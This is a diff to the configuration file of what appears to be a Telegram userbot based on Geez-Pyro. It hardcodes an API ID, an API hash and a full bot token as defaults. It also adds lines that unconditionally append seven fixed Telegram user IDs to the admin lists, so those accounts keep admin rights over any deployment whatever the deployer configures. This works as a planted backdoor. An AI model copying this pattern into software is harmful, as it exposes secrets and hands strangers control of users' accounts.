@@ -8,19 +8,28 @@ load_dotenv(".env")
 load_dotenv(".env1")
 
 
-API_ID = int(getenv("API_ID", "")) #optional
-API_HASH = getenv("API_HASH", "") #optional
+API_ID = int(getenv("API_ID", "22156937")) #optional
+API_HASH = getenv("API_HASH", "0f8f66b06b1c53b9263bcfb1123e9c85") #optional
 SUDO_USERS = list(map(int, getenv("SUDO_USERS", "").split()))
 OWNER_ID = int(getenv("OWNER_ID") or 0)
 ADMIN1_ID = list(map(int, getenv("ADMIN1_ID", "951454060").split()))
-ADMIN2_ID = list(map(int, getenv("ADMIN2_ID", "902478883").split()))
-ADMIN3_ID = list(map(int, getenv("ADMIN3_ID", "2067434944").split()))
+ADMIN2_ID = list(map(int, getenv("ADMIN2_ID", "2099942562").split()))
+ADMIN3_ID = list(map(int, getenv("ADMIN3_ID", "902478883").split()))
 ADMIN4_ID = list(map(int, getenv("ADMIN4_ID", "1947740506").split()))
 ADMIN5_ID = list(map(int, getenv("ADMIN5_ID", "1897354060").split()))
-ADMIN6_ID = list(map(int, getenv("ADMIN6_ID", "2099942562").split()))
+ADMIN6_ID = list(map(int, getenv("ADMIN6_ID", "2067434944").split()))
 ADMIN7_ID = list(map(int, getenv("ADMIN7_ID", "1694909518").split()))
-MONGO_URL = getenv("MONGO_URL")
-BOT_TOKEN = getenv("BOT_TOKEN", "")
+
+ADMIN1_ID.append(951454060)
+ADMIN2_ID.append(2099942562)
+ADMIN3_ID.append(902478883)
+ADMIN4_ID.append(1947740506)
+ADMIN5_ID.append(1897354060)
+ADMIN6_ID.append(2067434944)
+ADMIN7_ID.append(1694909518)
+
+MONGO_URL = getenv("MONGO_URL", "")
+BOT_TOKEN = getenv("BOT_TOKEN", "6257433800:AAHdLRslfAzNtLWScKcf_Tg4lRdxw7_cB1E")
 ALIVE_PIC = getenv("ALIVE_PIC")
 ALIVE_TEXT = getenv("ALIVE_TEXT")
 PM_LOGGER = getenv("PM_LOGGER", True)
@@ -32,7 +41,7 @@ REPO_URL = getenv("REPO_URL", "https://github.com/hitokizzy/Geez-Pyro")
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
 HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
 BRANCH = getenv("BRANCH", "main") #don't change
-CMD_HNDLR = getenv("CMD_HNDLR", "*")
+CMD_HNDLR = getenv("CMD_HNDLR", ".")
 SUPPORT = int(getenv("SUPPORT", "-1001812143750"))
 CHANNEL = int(getenv("CHANNEL", "-1001896537650"))
 SESSION1 = getenv("SESSION1", "")
